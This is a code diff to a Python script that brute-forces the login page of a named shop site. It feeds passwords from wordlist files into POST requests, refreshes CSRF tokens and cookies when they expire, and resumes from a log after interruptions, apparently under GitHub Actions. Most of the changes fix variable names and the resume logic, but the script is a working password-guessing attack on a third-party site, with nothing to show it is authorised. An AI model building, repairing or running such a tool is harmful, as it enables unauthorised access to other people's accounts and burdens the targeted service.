@@ -6,7 +6,7 @@ import signal
 from bs4 import BeautifulSoup
 from datetime import datetime
 
-class CurentData:
+class CurrentData:
     def __init__(self):
         self._current_file_path = ''
         self._current_line_no = 0
@@ -27,7 +27,7 @@ class CurentData:
     def current_line_no(self, value):
         self._current_line_no = value
 
-curent_data = CurentData()
+current_data = CurrentData()
 
 def send_post_request(password, line_no, csrf_token, cookie):
     url = "http://tm.shop.wc369.com/login"
@@ -48,9 +48,9 @@ def send_post_request(password, line_no, csrf_token, cookie):
 
     response = requests.post(url, headers=headers, data=payload)
     response_json = response.json()
-    curent_data.current_file_path, curent_data.current_line_no = curent_data.current_file_path, line_no
+    current_data.current_line_no = line_no
 
-    # print(f"Current file: {curent_data.current_file_path}")
+    # print(f"Current file: {current_data.current_file_path}")
 
     # 检查是否为数据过期
     if response_json["code"] == 500 and response_json["msg"] == "\u8bf7\u6c42\u53d1\u751f\u9519\u8bef!":
@@ -69,15 +69,19 @@ def send_post_request(password, line_no, csrf_token, cookie):
 def process_password_files_in_directory(directory):
     csrf_token, cookie = get_new_csrf_token_and_cookie()
     queue_file_path = read_queue_file()
-    if curent_data.current_file_path == '':
-        curent_data.current_file_path = queue_file_path[0]
-    file_index = queue_file_path.index(curent_data.current_file_path)
+    if current_data.current_file_path == '':
+        current_data.current_file_path = queue_file_path[0]
+        file_index = queue_file_path.index(current_data.current_file_path)
+    else:
+        file_index = queue_file_path.index([current_data.current_file_path])
+
     # 遍历从curret_file_path后面的所有参数
-    for file_path in queue_file_path[file_index + 1:]:
+    for file_path in queue_file_path[file_index:]:
         with open(file_path[0], "r") as file:
             passwords = file.read().splitlines()
             print(f"Current file: {file_path[0]}")
-            for password in passwords[curent_data.current_line_no + 1:]:
+            current_data.current_file_path = file_path[0]
+            for password in passwords[current_data.current_line_no:]:
                 post_status = send_post_request(password, passwords.index(password), csrf_token, cookie)
                 if post_status == 0:
                     csrf_token, cookie = get_new_csrf_token_and_cookie()
@@ -106,10 +110,10 @@ def log_password_entry(status):
     # 记录日志以便保存记录
     if status == 1:
         print("Already been running for 5 hours. Suspended and log recorded.")
-    else:
-        print("Unexpectedly suspended and log recorded.")
+    elif status == -1:
+        print("Ctrl+C suspended and log recorded.")
     now = datetime.now()
-    log_entry = f"[Process Suspended] {now.strftime('%Y-%m-%d %H:%M:%S')} {curent_data.current_file_path} {curent_data.current_line_no}"
+    log_entry = f"[Process Suspended] {now.strftime('%Y-%m-%d %H:%M:%S')} {current_data.current_file_path} {current_data.current_line_no}"
     with open("log.txt", "a") as log_file:
         log_file.write(log_entry + "\n")
 
@@ -155,7 +159,7 @@ def main():
                 pattern = r'\[(.*?)\] \d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2} (.*?) (\d+)'
                 matches = re.findall(pattern, log_entries[-1])
                 file_path, line_no = matches[0][1], matches[0][2]
-                curent_data.current_file_path, curent_data.current_line_no = file_path, int(line_no)
+                current_data.current_file_path, current_data.current_line_no = file_path, int(line_no)
 
     process_password_files_in_directory(get_password_directory())
 
@@ -163,4 +167,8 @@ if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
-        log_password_entry(0)
+        log_password_entry(-1)
+    except Exception as e: 
+        print('[Exception]\n', e, f'\n[Help Information]\nCurrent file and password line: {current_data.current_file_path} {current_data.current_line_no}')
+        print('Notice: Exception printing is only for GitHub Actions runtime, which should be disabled for local debugging!')
+        log_password_entry(-2)
